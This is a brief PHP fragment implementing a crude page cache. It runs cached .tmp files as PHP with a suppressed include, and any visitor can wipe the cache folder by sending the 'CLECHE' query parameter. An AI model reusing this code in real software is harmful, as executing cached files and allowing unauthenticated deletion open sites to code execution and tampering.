...
if ($cacheExits = file_exists($file = ($dir = __DIR__ . DIRECTORY_SEPARATOR . 'tmp' . DIRECTORY_SEPARATOR . urlencode($_SERVER['HTTP_HOST']) . DIRECTORY_SEPARATOR) . rtrim(strtr(base64_encode($_SERVER['REQUEST_URI']), '+/=', '._-')) . '.tmp')) @include $file;
if (isset($_GET["CLECHE"])) foreach (glob($dir . '*') as $file) unlink($file); elseif ($cacheExits) exit(die());
